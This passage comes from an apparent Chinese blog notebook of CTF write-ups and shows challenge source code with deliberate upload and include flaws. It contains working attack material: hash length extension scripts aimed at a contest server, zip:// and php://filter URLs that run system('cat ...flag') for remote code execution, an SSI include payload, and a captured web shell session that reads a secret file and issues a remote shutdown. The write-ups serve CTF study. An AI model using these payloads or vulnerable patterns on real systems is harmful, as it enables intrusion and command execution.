$klen]) % <span class="number">128</span>);</span><br><span class="line">			<span class="comment">// chr 字符，ord ASCII码</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode($str);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	import hashlib</span><br><span class="line">	import base64</span><br><span class="line"></span><br><span class="line">	key = hashlib.md5(<span class="string">"ISCC"</span>.encode(<span class="string">'utf-8'</span>)).hexdigest()</span><br><span class="line">	base_64 = <span class="string">"fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA="</span></span><br><span class="line">	base_64 = base64.b64decode(base_64)</span><br><span class="line">	data_len = len(base_64)</span><br><span class="line"></span><br><span class="line">	str_ = <span class="string">""</span></span><br><span class="line">	<span class="keyword">for</span> i in range(len(base_64)):</span><br><span class="line">		str_ += chr((base_64[i]-ord(key[i%len(key)]))%<span class="number">128</span>)  <span class="comment"># 这个题有点水</span></span><br><span class="line">	<span class="keyword">print</span>(str_)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 文件上传2(湖湘杯)</span></span><br><span class="line">	这个题有点坑，我把源码都弄下来后仔细的看能不能绕过，结果看下别人的wp，直接有一个flag.php，我之前没扫出来。</span><br><span class="line">	这教会了我一个道理，先扫flag，flag.php已加入字典，以后就能扫出来了。</span><br><span class="line">	</span><br><span class="line">	下面的安全性已经非常高了，后缀被控死</span><br><span class="line">	upload.php</span><br><span class="line"></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) &amp;&amp; <span class="keyword">isset</span>($_FILES[<span class="string">'image'</span>])) &#123;</span><br><span class="line">		$fn = $_FILES[<span class="string">'image'</span>][<span class="string">'tmp_name'</span>];     <span class="comment">// 存储在服务器的文件的临时副本的名称</span></span><br><span class="line">		$ft = $_FILES[<span class="string">'image'</span>][<span class="string">'type'</span>];         <span class="comment">// 上传文件的类型</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(!is_uploaded_file($fn)) &#123;  <span class="comment">// 判断指定的文件是否是通过 HTTP POST 上传的。</span></span><br><span class="line">			fatal(<span class="string">'uploaded file corrupted'</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$array = <span class="keyword">array</span>(<span class="string">'image/png'</span>);</span><br><span class="line">		<span class="keyword">if</span>(!in_array($ft,$array))&#123;</span><br><span class="line">			fatal(<span class="string">"Sorry, only PNG files are allowed."</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$imagekey = create_image_key();</span><br><span class="line"></span><br><span class="line">		move_uploaded_file($fn, <span class="string">"uploads/$imagekey.png"</span>);</span><br><span class="line"></span><br><span class="line">		header(<span class="string">"Location: ?op=show&amp;imagekey=$imagekey"</span>);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	show.php</span><br><span class="line"></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">include</span> <span class="string">'common.php'</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">empty</span>($_GET[<span class="string">'imagekey'</span>])) &#123;</span><br><span class="line">		header(<span class="string">'Location: ?op=home'</span>);</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	$imagekey = $_GET[<span class="string">'imagekey'</span>];</span><br><span class="line">	$im = load_image($imagekey);</span><br><span class="line"></span><br><span class="line">	$w = imagesx($im);</span><br><span class="line">	$h = imagesy($im);</span><br><span class="line">	<span class="keyword">if</span>($w &gt; MAX_IM_SIZE || $h &gt; MAX_IM_SIZE)</span><br><span class="line">		fatal(<span class="string">"Invalid image dimensions."</span>);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;center&gt;</span><br><span class="line">	&lt;div class="article"&gt;</span><br><span class="line">		&lt;h2&gt;&lt;/h2&gt;</span><br><span class="line">		&lt;p&gt;&lt;img src=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span> /&gt;</span><br><span class="line">		&lt;div&gt;</span><br><span class="line">			&lt;a href=<span class="string">"uploads/&lt;?=$imagekey;?&gt;.png"</span>&gt;View saved image&lt;/a&gt;</span><br><span class="line">		&lt;/div&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">	&lt;/center&gt; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	common.php</span><br><span class="line"></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">if</span>(!defined(<span class="string">'FROM_INDEX'</span>)) <span class="keyword">die</span>();</span><br><span class="line"></span><br><span class="line">	define(<span class="string">'MAX_IM_SIZE'</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">create_image_key</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> sha1($_SERVER[<span class="string">'REMOTE_ADDR'</span>] . $_SERVER[<span class="string">'HTTP_USER_AGENT'</span>] . time() . mt_rand());</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">load_image</span><span class="params">($imagekey)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="number">1</span> !== preg_match(<span class="string">'/[0-9a-f]&#123;40&#125;/'</span>, $imagekey)) &#123;</span><br><span class="line">			fatal(<span class="string">'Invalid image key.'</span>);</span><br><span class="line">			<span class="comment">// imagekey=9f6703af622b96dc1a4d01b889587f1ee3fc88d7</span></span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		$im = imagecreatefrompng(<span class="string">"uploads/&#123;$imagekey&#125;.png"</span>);</span><br><span class="line">		<span class="keyword">if</span>(!$im) &#123;</span><br><span class="line">			fatal(<span class="string">'Failed to load image.'</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> $im;</span><br><span class="line">	&#125;</span><br><span class="line">	stream_wrapper_unregister (<span class="string">"zip"</span>);</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这是一个神奇的登录框</span></span><br><span class="line">	直接sqlmap的post注入搞定了</span><br><span class="line"></span><br><span class="line"><span class="comment"># ssi</span></span><br><span class="line">	EIS2018题感觉不错加上了</span><br><span class="line">	http:<span class="comment">//httpd.apache.org/docs/current/howto/ssi.html</span></span><br><span class="line">	https:<span class="comment">//www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</span></span><br><span class="line">	https:<span class="comment">//blog.csdn.net/wutianxu123/article/details/82724637</span></span><br><span class="line">	https:<span class="comment">//www.secpulse.com/archives/66934.html</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">TinySSI</span> </span>&#123;</span><br><span class="line">		<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">parse</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">			$parsed = $connect;</span><br><span class="line">			<span class="comment">/** #include **/</span></span><br><span class="line">			$parsed = preg_replace_callback(<span class="string">'|&lt;!--#include virtual="(.*?)"(\s)*--&gt;|'</span>,</span><br><span class="line">			<span class="function"><span class="keyword">function</span> <span class="params">($matches)</span> </span>&#123; </span><br><span class="line">				$output = file_get_contents(<span class="string">"./"</span> . $matches[<span class="number">1</span>]); </span><br><span class="line">				<span class="keyword">return</span> $output; </span><br><span class="line">			&#125;, $parsed); </span><br><span class="line">			<span class="keyword">return</span> $parsed; </span><br><span class="line">		&#125; </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"Flag is in the file 'flag' in this path\n"</span>;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">'ssi.php'</span>);</span><br><span class="line">	$parser = <span class="keyword">new</span> TinySSI;</span><br><span class="line">	<span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'name'</span>]))&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">"Your name is "</span> . $parser-&gt;parse($_GET[<span class="string">'name'</span>]));</span><br><span class="line">		<span class="keyword">exit</span>();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line">	&lt;!--<span class="comment">#include virtual="flag" --&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql注入2</span></span><br><span class="line">	全都tm过滤了绝望吗？</span><br><span class="line">	提示 !,!=,=,+,-,^,%</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag 被盗</span></span><br><span class="line">	跟踪了几个TCP流，发现shell.php，后来在TCP流中直接看到了flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 中国菜刀</span></span><br><span class="line">	看了几个数据流，发现了一下内容</span><br><span class="line">	flag.tar.gz	<span class="number">2016</span><span class="number">-06</span><span class="number">-27</span> <span class="number">08</span>:<span class="number">45</span>:<span class="number">38</span>	<span class="number">203</span>	<span class="number">0666</span></span><br><span class="line">	log.txt	<span class="number">2015</span><span class="number">-06</span><span class="number">-03</span> <span class="number">12</span>:<span class="number">18</span>:<span class="number">46</span>	<span class="number">1502</span>	<span class="number">0666</span></span><br><span class="line">	news.asp	<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">03</span>:<span class="number">44</span>:<span class="number">24</span>	<span class="number">365</span>	<span class="number">0666</span></span><br><span class="line">	SaveFile.asp	<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">05</span>:<span class="number">45</span>:<span class="number">08</span>	<span class="number">822</span>	<span class="number">0666</span></span><br><span class="line">	testNull.php	<span class="number">2014</span><span class="number">-07</span><span class="number">-17</span> <span class="number">08</span>:<span class="number">06</span>:<span class="number">14</span>	<span class="number">16</span>	<span class="number">0666</span></span><br><span class="line">	upload.html	<span class="number">2014</span><span class="number">-06</span><span class="number">-27</span> <span class="number">05</span>:<span class="number">27</span>:<span class="number">46</span>	<span class="number">364</span>	<span class="number">0666</span></span><br><span class="line">	webshell.php	<span class="number">2014</span><span class="number">-07</span><span class="number">-21</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">36</span>	<span class="number">18</span>	<span class="number">0666</span></span><br><span class="line">	xiaoma.asp;.jpg	<span class="number">2014</span><span class="number">-07</span><span class="number">-04</span> <span class="number">08</span>:<span class="number">17</span>:<span class="number">18</span>	<span class="number">1312</span>	<span class="number">0666</span></span><br><span class="line"></span><br><span class="line">	猜测 caidao.pcapng 包含了其他文件</span><br><span class="line">	使用 binwalk 查看一下</span><br><span class="line">	<span class="number">7747</span>          <span class="number">0x1E43</span>          gzip compressed data, from Unix, last modified: <span class="number">2016</span><span class="number">-06</span><span class="number">-27</span> <span class="number">08</span>:<span class="number">44</span>:<span class="number">39</span></span><br><span class="line">	</span><br><span class="line">	提取 dd <span class="keyword">if</span>=caidao.pcapng of=<span class="number">1.</span>gzip skip=<span class="number">7747</span> bs=<span class="number">1</span> </span><br><span class="line">	</span><br><span class="line">	解压 ➜  CTF tar -xvf <span class="number">1.</span>gzip </span><br><span class="line">	gzip: stdin: decompression OK, trailing garbage ignored</span><br><span class="line">	flag/</span><br><span class="line">	flag/flag.txt</span><br><span class="line">	tar: Child returned status <span class="number">2</span></span><br><span class="line">	tar: Error is not recoverable: exiting now</span><br><span class="line"></span><br><span class="line">	可直接导出？以后补充</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这么多数据包</span></span><br><span class="line">	打开一看真的是很多数据包，看一下http，没有。</span><br><span class="line">	题目提示，寻找 getshell 流。一般的 getshell 流的 TCP 的报文中很可能包含 command 这个字段，</span><br><span class="line">	我们可以通过 【协议 contains <span class="string">"内容"</span>】 来查找 getshell 流</span><br><span class="line">	tcp contains <span class="string">"command"</span></span><br><span class="line">	看到几个tcp</span><br><span class="line">	再追踪tcp流</span><br><span class="line">	C:\&gt;type s4cr4t.txt</span><br><span class="line">	type s4cr4t.txt</span><br><span class="line">	Q0NURntkb195b3VfbGlrZV9zbmlmZmVyfQ==</span><br><span class="line">	C:\&gt;shutdown -r -t <span class="number">100</span> -m <span class="string">"Stupid Manager!"</span></span><br><span class="line">	shutdown -r -t <span class="number">100</span> -m <span class="string">"Stupid Manager!"</span></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line"><span class="comment"># 百越杯 买手机</span></span><br><span class="line">	重点学习 zio</span><br><span class="line">	import hashpumpy</span><br><span class="line">	import urllib</span><br><span class="line">	from urlparse import parse_qsl</span><br><span class="line">	from zio import *</span><br><span class="line">	import re, string, itertools</span><br><span class="line">	io = zio((<span class="string">'117.50.13.182'</span>, <span class="number">8888</span>))</span><br><span class="line">	io.read_until(<span class="string">'Command: '</span>)</span><br><span class="line">	io.writeline(<span class="string">'2'</span>)</span><br><span class="line">	io.writeline(<span class="string">'9'</span>)</span><br><span class="line">	io.read_until(<span class="string">'Your order:\n'</span>)</span><br><span class="line">	c = io.readline(<span class="string">'\n'</span>)</span><br><span class="line">	d = parse_qsl(c)</span><br><span class="line">	hash = d[<span class="number">3</span>][<span class="number">1</span>].strip()</span><br><span class="line">	pr = <span class="string">'product=Flag&amp;price=99999&amp;timestamp=%s'</span>%(d[<span class="number">2</span>][<span class="number">1</span>])</span><br><span class="line">	<span class="keyword">print</span> hash, pr</span><br><span class="line">	<span class="keyword">for</span> i in range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">		ret = hashpumpy.hashpump(hash, pr, <span class="string">'&amp;price=233'</span>, i)</span><br><span class="line">		order = <span class="string">'%s&amp;sign=%s'</span> %(ret[<span class="number">1</span>], ret[<span class="number">0</span>])</span><br><span class="line">		io.writeline(<span class="string">'3'</span>)</span><br><span class="line">		io.read_until(<span class="string">'\n'</span>)</span><br><span class="line">		io.writeline(order)</span><br><span class="line">		io.read_until(<span class="string">'Command: '</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	from pwn import *</span><br><span class="line">	<span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">	import hashpumpy</span><br><span class="line">	p = remote(<span class="string">"117.50.13.182"</span>,<span class="number">8888</span>)</span><br><span class="line"></span><br><span class="line">	p.sendline(<span class="string">'2'</span>)</span><br><span class="line">	p.sendline(<span class="string">'9'</span>)</span><br><span class="line">	timestamp = p.recvuntil(<span class="string">"&amp;sign="</span>)[<span class="number">-22</span>:<span class="number">-6</span>]</span><br><span class="line"></span><br><span class="line">	sign = p.recvuntil(<span class="string">"\n"</span>)</span><br><span class="line">	sign = sign[:<span class="number">-1</span>]</span><br><span class="line">	pr = <span class="string">"product=Flag&amp;price=99999&amp;timestamp="</span>+timestamp</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> i in range(<span class="number">8</span>,<span class="number">32</span>):</span><br><span class="line">		ret = hashpumpy.hashpump(sign,pr,<span class="string">"&amp;price=11"</span>,i) </span><br><span class="line">		order = <span class="string">'%s&amp;sign=%s'</span>%(ret[<span class="number">1</span>],ret[<span class="number">0</span>])</span><br><span class="line">		temp = p.recv()</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"Well"</span> in temp:</span><br><span class="line">			<span class="keyword">print</span> <span class="string">"------------------------------&gt;&gt;&gt;&gt;&gt;"</span>,temp</span><br><span class="line">			<span class="keyword">exit</span>()</span><br><span class="line">		p.sendline(<span class="string">'3'</span>)</span><br><span class="line">		p.recv()</span><br><span class="line">		p.sendline(str(order))</span><br><span class="line">	<span class="comment">#flag&#123;Hash_leNgth_eXt3ns1on_attack_!S)_E@sy&#125;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># SWPUCTF2018 web3</span></span><br><span class="line">	乍一看</span><br><span class="line"></span><br><span class="line"><span class="comment"># XCTF adworld Guess</span></span><br><span class="line">    伪协议查看源码：</span><br><span class="line">	http:<span class="comment">//111.198.29.45:32406/?page=php://filter/read=convert.base64-encode/resource=index</span></span><br><span class="line"></span><br><span class="line">	upload.php	</span><br><span class="line">	<span class="meta">&lt;?php</span></span><br><span class="line">	error_reporting(<span class="number">0</span>);</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_error_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">		&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">show_message</span><span class="params">($message)</span> </span>&#123;</span><br><span class="line">		<span class="keyword">echo</span>(<span class="string">"&lt;div class=\"msg success\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">		&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;"</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">random_str</span><span class="params">($length = <span class="string">"32"</span>)</span> </span>&#123;</span><br><span class="line">		$set = <span class="keyword">array</span>(<span class="string">"a"</span>, <span class="string">"A"</span>, <span class="string">"b"</span>, <span class="string">"B"</span>, <span class="string">"c"</span>, <span class="string">"C"</span>, <span class="string">"d"</span>, <span class="string">"D"</span>, <span class="string">"e"</span>, <span class="string">"E"</span>, <span class="string">"f"</span>, <span class="string">"F"</span>,</span><br><span class="line">			<span class="string">"g"</span>, <span class="string">"G"</span>, <span class="string">"h"</span>, <span class="string">"H"</span>, <span class="string">"i"</span>, <span class="string">"I"</span>, <span class="string">"j"</span>, <span class="string">"J"</span>, <span class="string">"k"</span>, <span class="string">"K"</span>, <span class="string">"l"</span>, <span class="string">"L"</span>,</span><br><span class="line">			<span class="string">"m"</span>, <span class="string">"M"</span>, <span class="string">"n"</span>, <span class="string">"N"</span>, <span class="string">"o"</span>, <span class="string">"O"</span>, <span class="string">"p"</span>, <span class="string">"P"</span>, <span class="string">"q"</span>, <span class="string">"Q"</span>, <span class="string">"r"</span>, <span class="string">"R"</span>,</span><br><span class="line">			<span class="string">"s"</span>, <span class="string">"S"</span>, <span class="string">"t"</span>, <span class="string">"T"</span>, <span class="string">"u"</span>, <span class="string">"U"</span>, <span class="string">"v"</span>, <span class="string">"V"</span>, <span class="string">"w"</span>, <span class="string">"W"</span>, <span class="string">"x"</span>, <span class="string">"X"</span>,</span><br><span class="line">			<span class="string">"y"</span>, <span class="string">"Y"</span>, <span class="string">"z"</span>, <span class="string">"Z"</span>, <span class="string">"1"</span>, <span class="string">"2"</span>, <span class="string">"3"</span>, <span class="string">"4"</span>, <span class="string">"5"</span>, <span class="string">"6"</span>, <span class="string">"7"</span>, <span class="string">"8"</span>, <span class="string">"9"</span>);</span><br><span class="line">		$str = <span class="string">''</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span> ($i = <span class="number">1</span>; $i &lt;= $length; ++$i) &#123;</span><br><span class="line">			$ch = mt_rand(<span class="number">0</span>, count($set) - <span class="number">1</span>);</span><br><span class="line">			$str .= $set[$ch];</span><br><span class="line">		&#125;</span><br><span class="line">		$filename = <span class="string">'./uP1O4Ds/'</span> . $str . <span class="string">'_'</span></span><br><span class="line">		<span class="keyword">return</span> $str;</span><br><span class="line">	&#125;</span><br><span class="line">	session_start();</span><br><span class="line"></span><br><span class="line">	$reg=<span class="string">'/gif|jpg|jpeg|png/'</span>;</span><br><span class="line">	<span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">		$seed = rand(<span class="number">0</span>,<span class="number">999999999</span>);  <span class="comment">// 生成随机数做种子</span></span><br><span class="line">		mt_srand($seed);  <span class="comment">// 用seed给随机数发生器播种</span></span><br><span class="line">		$ss = mt_rand();  <span class="comment">// 取随机数</span></span><br><span class="line">		$hash = md5(session_id() . $ss);	</span><br><span class="line">		setcookie(<span class="string">'SESSI0N'</span>, $hash, time() + <span class="number">3600</span>);</span><br><span class="line">		<span class="comment">// SESSION e6bf37f50f6f9f290e834613beb73cac  4bfeacdfd8404d5c03e91441ffef3a18</span></span><br><span class="line">		<span class="comment">// 得到一个随机数 352940737</span></span><br><span class="line">		<span class="comment">// 得到可能的种子 3281694990 3281694991 981279433</span></span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/xlKZUYfp47Dl1cHKvGz84VIY64sIItpF_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/uISoLxXH6C3FBakm7buwAMVQGR3zwRoG_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/HNugRX9Vq7I2o9Tq67KrDbERlYpMjZGp_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/HQQ6DPmMEyttuA9AB5bic3MzOfOTKSa4_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment">zip://uP1O4Ds/H4zDu3QZU6pbeFFLl8ax8TKMDwusUQfu_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">		*/</span></span><br><span class="line"></span><br><span class="line">		zip:<span class="comment">//uP1O4Ds/Ah86F1AZxgsLc8UUjkHPZRKMoCM3XUdT_test.png%23test&amp;a=phpinfo();</span></span><br><span class="line">		</span><br><span class="line">		/uP1O4Ds/NugRX9Vq7I2o9Tq67KrDbERlYpMjZGpI_test.png</span><br><span class="line"></span><br><span class="line">		zip:<span class="comment">//uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png1&amp;a=phpinfo();</span></span><br><span class="line"></span><br><span class="line">		zip:<span class="comment">//uP1O4Ds/fds3uXk1hjEypt342Br71GmEuSvDpGSo_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line">		zip:<span class="comment">//uP1O4Ds/st8LyW7GqjK8SniSUB7RCBERGsHrplZn_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line">		zip:<span class="comment">//uP1O4Ds/OjOqKNhiJZUIgqFKGTVLHvk99BZNejf6_1.png/1&amp;a=echo system('ls');</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($_FILES[<span class="string">"file"</span>][<span class="string">"error"</span>] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">			show_error_message(<span class="string">"Upload ERROR. Return Code: "</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"error"</span>]);</span><br><span class="line">		&#125;</span><br><span class="line">		$check2 = ((($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/gif"</span>)</span><br><span class="line">				|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/jpeg"</span>)</span><br><span class="line">				|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/pjpeg"</span>)</span><br><span class="line">				|| ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>] == <span class="string">"image/png"</span>))</span><br><span class="line">			&amp;&amp; ($_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"size"</span>] &lt; <span class="number">204800</span>));</span><br><span class="line">		$check3=!preg_match($reg,pathinfo($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>], PATHINFO_EXTENSION));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ($check3) show_error_message(<span class="string">"Nope!"</span>);</span><br><span class="line">		<span class="keyword">if</span> ($check2) &#123;</span><br><span class="line">			$filename = <span class="string">'./uP1O4Ds/'</span> . random_str() . <span class="string">'_'</span> . $_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'name'</span>];</span><br><span class="line">			<span class="keyword">if</span> (move_uploaded_file($_FILES[<span class="string">'file-upload-field'</span>][<span class="string">'tmp_name'</span>], $filename)) &#123;</span><br><span class="line">				show_message(<span class="string">"Upload successfully. File type:"</span> . $_FILES[<span class="string">"file-upload-field"</span>][<span class="string">"type"</span>]);</span><br><span class="line">			&#125; <span class="keyword">else</span> show_error_message(<span class="string">"Something wrong with the upload..."</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			show_error_message(<span class="string">"only allow gif/jpeg/png files smaller than 200kb!"</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'page'</span>]))&#123;</span><br><span class="line">	$page=$_GET[<span class="string">'page'</span>];</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	$page=<span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/\.\./'</span>,$page)) &#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">	&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"</span>;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($page) &#123;</span><br><span class="line">	<span class="keyword">if</span>(!(<span class="keyword">include</span>($page.<span class="string">'.php'</span>))) &#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;div class=\"msg error\" id=\"message\"&gt;</span></span><br><span class="line"><span class="string">	&lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"</span>;</span><br><span class="line">		<span class="keyword">exit</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">	爆破随机数种子(session_id为我们的 PHPSESSID，hash为SESSI0N)</span><br><span class="line">	ini_set(‘max_execution_time’, ‘<span class="number">0</span>’);  <span class="comment">// 设置运行时间无限</span></span><br><span class="line"></span><br><span class="line">	http:<span class="comment">//111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&amp;a=echo%20system(%27cat%20./flag-Edi98vJF8hnIp.txt%27);</span></span><br><span class="line">	xctf&#123;<span class="number">3</span>fbbe15371c9cd42ec1a698d7660849a&#125; xctf&#123;<span class="number">3</span>fbbe15371c9cd42ec1a698d7660849a&#125;</span><br><span class="line">	http:<span class="comment">//111.198.29.45:30278/?page=zip://uP1O4Ds/FQclJFtaEBXXgNuc4nfI1kC7HXTZn3Xx_test.png%23test/test&amp;a=echo%20system(%27ls%27);</span></span><br><span class="line">	CSS flag-Edi98vJF8hnIp.txt index.html index.php js uP1O4Ds upload.php upload.php</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># adworld simple_js</span></span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">dechiffre</span><span class="params">(pass_enc)</span></span>&#123;</span><br><span class="line">		<span class="keyword">var</span> pass = <span class="string">"70,65,85,88,32,80,65,83,83,87,79,82,68,32,72,65,72,65"</span>;</span><br><span class="line">		<span class="keyword">var</span> tab  = pass_enc.split(<span class="string">','</span>);</span><br><span class="line">		<span class="keyword">var</span> tab2 = pass.split(<span class="string">','</span>);</span><br><span class="line">		<span class="keyword">var</span> i,j,k,l=<span class="number">0</span>,m,n,o,p = <span class="string">""</span>;</span><br><span class="line">		i = <span class="number">0</span>;</span><br><span class="line">		j = tab.length;</span><br><span class="line">		k = j + (l) + (n=<span class="number">0</span>);</span><br><span class="line">		n = tab2.length;</span><br><span class="line">		<span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ ) &#123;</span><br><span class="line">			o = tab[i-l];</span><br><span class="line">			p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">			<span class="keyword">if</span>(i == <span class="number">5</span>) </span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(i = (o=<span class="number">0</span>); i &lt; (k = j = n); i++ )&#123;</span><br><span class="line">			o = tab[i-l];</span><br><span class="line">			<span class="keyword">if</span>(i &gt; <span class="number">5</span> &amp;&amp; i &lt; k<span class="number">-1</span>)</span><br><span class="line">					p += String.fromCharCode((o = tab2[i]));</span><br><span class="line">		&#125;</span><br><span class="line">		p += String.fromCharCode(tab2[<span class="number">17</span>]);</span><br><span class="line">		pass = p;</span><br><span class="line">		<span class="keyword">return</span> pass;</span><br><span class="line">	&#125;</span><br><span class="line">	String[<span class="string">"fromCharCode"</span>](dechiffre(<span 